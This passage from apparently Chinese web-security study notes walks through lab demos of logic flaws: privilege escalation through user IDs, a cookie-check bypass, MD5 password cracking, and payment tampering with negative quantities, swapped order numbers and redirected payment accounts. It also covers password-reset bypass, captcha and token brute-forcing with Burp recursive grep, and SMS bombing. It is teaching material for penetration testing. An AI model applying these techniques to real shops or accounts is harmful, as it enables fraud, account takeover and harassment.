<p>返回网页登录页，仔细查看马春生的图像，f12查看发现图片的名字跟card_id有关联，说明既有可能是马春生的card_id</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203311191.png"
                      alt="image-20221117203311191"
                ></p>
<p>返回数据包，查看该值的数据，可能就是马春生的信息</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203421886.png"
                      alt="image-20221117203421886"
                ></p>
<p>返回包查看账号密码，登入验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203534056.png"
                      alt="image-20221117203534056"
                ></p>
<p>密码md5加密，解密一下，得到密码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203615549.png"
                      alt="image-20221117203615549"
                ></p>
<p>登入账号，结束！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221117203653213.png"
                      alt="image-20221117203653213"
                ></p>
<h6 id="漏洞产生原理"><a href="#漏洞产生原理" class="headerlink" title="漏洞产生原理"></a>漏洞产生原理</h6><p>前端安全造成：界面</p>
<p>判断用户等级之后，代码界面部分进行可选显示</p>
<p>后端安全造成：数据库</p>
<p>user表（管理员和普通用户同表）：id，username，password，usertype</p>
<p>​                                                               1     admin            123456              1</p>
<p>​                                                               2     xiaodi            555555               2</p>
<p>登陆用户admin或小迪时，怎么判断是什么级别的用户？</p>
<p>通过usertype值来判断</p>
<p>如果在访问网站数据包中有传输用户的编号、用户组编号或者类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本方法。</p>
<h2 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h2><h3 id="登录应用功能点安全问题"><a href="#登录应用功能点安全问题" class="headerlink" title="登录应用功能点安全问题"></a>登录应用功能点安全问题</h3><p>1.直接通过爆破绕过</p>
<p>2.cookie脆弱性</p>
<p>分析以下代码发现，它只对cookie中user的值是否为空进行验证，只要保证user的值不为空，随便一个数据都可以绕过验证</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154542565.png"
                      alt="image-20221118154542565"
                ></p>
<p>操作只要把cookie的值，改为user&#x3D;a或者任意一个数即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154848591.png"
                      alt="image-20221118154848591"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118154922813.png"
                      alt="image-20221118154922813"
                ></p>
<p>放包，进入后台</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118155003846.png"
                      alt="image-20221118155003846"
                ></p>
<p>以上是白盒测试结果，在黑盒环境（实战）中，如何确定？</p>
<p>在实战中一般看数据包的参数，一般看cookie值，但是十分的困难</p>
<h3 id="数据篡改安全问题"><a href="#数据篡改安全问题" class="headerlink" title="数据篡改安全问题"></a>数据篡改安全问题</h3><h4 id="支付篡改"><a href="#支付篡改" class="headerlink" title="支付篡改"></a>支付篡改</h4><p><a class="link"   href="https://www.secpulse.com/archives/67080.html" >https://www.secpulse.com/archives/67080.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h6 id="商城支付漏洞"><a href="#商城支付漏洞" class="headerlink" title="商城支付漏洞"></a>商城支付漏洞</h6><p>进入商城程序</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160616031.png"
                      alt="image-20221118160616031"
                ></p>
<p>点击购买，进行抓包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160725696.png"
                      alt="image-20221118160725696"
                ></p>
<p>发现数据包中有数量参数，但是没有发现金额数据</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118160751796.png"
                      alt="image-20221118160751796"
                ></p>
<p>尝试将数量改成负数，会不会价格也成负数？</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161056513.png"
                      alt="image-20221118161056513"
                ></p>
<p>果然！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161118507.png"
                      alt="image-20221118161118507"
                ></p>
<h6 id="订单情况分析"><a href="#订单情况分析" class="headerlink" title="订单情况分析"></a>订单情况分析</h6><p>更改订单编号，以1价格买2东西</p>
<p>第一个先买1件商品，生成订单</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161936394.png"
                      alt="image-20221118161936394"
                ></p>
<p>点击提交订单，抓取数据包，生成订单编号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118162057115.png"
                      alt="image-20221118162057115"
                ></p>
<p>生成一个新的订单，这次买10件，提交订单</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161508718.png"
                      alt="image-20221118161508718"
                ></p>
<p>提交订单，抓取数据包，得到本单的订单号</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161639771.png"
                      alt="image-20221118161639771"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118161804721.png"
                      alt="image-20221118161804721"
                ></p>
<p>将前一个只买一件的订单的订单号复制到该数据包中，放包</p>
<p>得到只需1件的价格就能买10件的支付订单</p>
<h6 id="修改价格以及商品的漏洞演示"><a href="#修改价格以及商品的漏洞演示" class="headerlink" title="修改价格以及商品的漏洞演示"></a>修改价格以及商品的漏洞演示</h6><p>进入网页</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163016002.png"
                      alt="image-20221118163016002"
                ></p>
<p>购买两个，抓取数据包，发现数量参数和价格</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163312968.png"
                      alt="image-20221118163312968"
                ></p>
<p>修改价格和数量，放包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163408592.png"
                      alt="image-20221118163408592"
                ></p>
<p>也可以修改商品的id来修改商品种类</p>
<p>数据包，商品的名字参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163541329.png"
                      alt="image-20221118163541329"
                ></p>
<p>换一款商品，抓取数据包，复制name和id参数</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118163815190.png"
                      alt="image-20221118163815190"
                ></p>
<p>将复制的name和id参数替换到便宜的商品的数据包中提交，放包，成功！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118164306598.png"
                      alt="image-20221118164306598"
                ></p>
<h6 id="支付方式"><a href="#支付方式" class="headerlink" title="支付方式"></a>支付方式</h6><p>可以更改支付接口，也就是改支付金额的提交账户，可以实现将钱支付到自己的账号上</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221118165142012.png"
                      alt="image-20221118165142012"
                ></p>
<p>简单来说就是：抓包-改包-支付-钱打到自己的账户上-购买成功</p>
<h2 id="验证和找回"><a href="#验证和找回" class="headerlink" title="验证和找回"></a>验证和找回</h2><h4 id="找回重置机制"><a href="#找回重置机制" class="headerlink" title="找回重置机制"></a>找回重置机制</h4><p>客户端回显、response状态值，验证码爆破，找回流程绕过</p>
<h6 id="1-找回流程绕过靶场演示"><a href="#1-找回流程绕过靶场演示" class="headerlink" title="1.找回流程绕过靶场演示"></a>1.找回流程绕过靶场演示</h6><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119132500738.png"
                      alt="image-20221119132500738"
                ></p>
<p>进入靶场</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119132537710.png"
                      alt="image-20221119132537710"
                ></p>
<p>直接用自己的手机号获取验证码，然后直接改成别人的手机号就行，抓包，数据包里面改</p>
<p>2.状态码修改漏洞：可以修改状态值，但是得看验证码的校准是在哪里验证的，服务器就不行，本地就可以抓取返回包修改返回状态值为成功即可</p>
<p>3.就是可以通过修改数据包跳过验证页面，直接修改的漏洞</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221119142436036.png"
                      alt="image-20221119142436036"
                ></p>
<p>4.爆破测试实例</p>
<p>把验证码参数作为爆破点执行爆破</p>
<p>5.app短信轰炸接口调用实例</p>
<p> 利用各种app的短信验证码发送接口，利用抓包工具进行抓取，并将这些接口数据包整合以一定的间隔时间触发发送，实现短信轰炸</p>
<h2 id="验证安全"><a href="#验证安全" class="headerlink" title="验证安全"></a>验证安全</h2><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><h3 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h3><p>分类：图片、手机或者邮箱、语音、视频、操作</p>
<h6 id="验证码的识别插件以及工具的操作演示"><a href="#验证码的识别插件以及工具的操作演示" class="headerlink" title="验证码的识别插件以及工具的操作演示"></a>验证码的识别插件以及工具的操作演示</h6><p>就是识别图片验证码插件，很简单不写了</p>
<h6 id="验证码绕过"><a href="#验证码绕过" class="headerlink" title="验证码绕过"></a>验证码绕过</h6><p>服务器验证：</p>
<p>先随便输入一个正确的验证码和错误的账号，发现提示账号密码错误</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144611245.png"
                      alt="image-20221121144611245"
                ></p>
<p>输入错误的验证码</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144645374.png"
                      alt="image-20221121144645374"
                ></p>
<p>抓包，试验一下改账号密码验证码不变重放数据包，是否报验证码错误，发现不报验证码错误，说明可以直接爆破</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121144916679.png"
                      alt="image-20221121144916679"
                ></p>
<p>将数据包发送到爆破模块，登陆成功</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121145109682.png"
                      alt="image-20221121145109682"
                ></p>
<p>客户端验证：</p>
<p>使劲点登陆，出现该弹窗，说明是客户端验证，源代码具有验证代码（前端验证）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121145353378.png"
                      alt="image-20221121145353378"
                ></p>
<p>爆破方法一样，就不说了</p>
<p>token绕过：</p>
<p>1.通过查看多个token值，推出规律，但是几乎不可能</p>
<p>2.替换法，将返回的验证数据包中的token值替换到请求包中即可，现在主要是要解决批量提交的问题</p>
<p>操作步骤：</p>
<p>抓取数据包</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152520703.png"
                      alt="image-20221121152520703"
                ></p>
<p>将数据包发送至爆破模块，并设置爆破项，密码及token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152720271.png"
                      alt="image-20221121152720271"
                ></p>
<p>更改模式</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152813967.png"
                      alt="image-20221121152813967"
                ></p>
<p>进入payloads，设置密码字典，和token</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121152913522.png"
                      alt="image-20221121152913522"
                ></p>
<p> 重点来了，设置token！！！</p>
<p>进入options</p>
<p>设置线程为1</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153042170.png"
                      alt="image-20221121153042170"
                ></p>
<p>往下翻，找到redirections，设置为always</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153231388.png"
                      alt="image-20221121153231388"
                ></p>
<p>再找到Grep-Extract，点击Add，找到token值选中，点击ok</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153554177.png"
                      alt="image-20221121153554177"
                ></p>
<p>回到payloads，设置2参数也就是token参数，设置为Recursive grep</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121153704611.png"
                      alt="image-20221121153704611"
                ></p>
<p>开始爆破，即可！</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image-1317166382.cos.ap-nanjing.myqcloud.com/image-20221121154019160.png"
                      alt="image-20221121154019160"
                ></p>
<p>这个操作主要就是把上一次的返回token，作为下一次的请求token替换，提交，即可绕过</p>
]]></content>
  </entry>
</search>
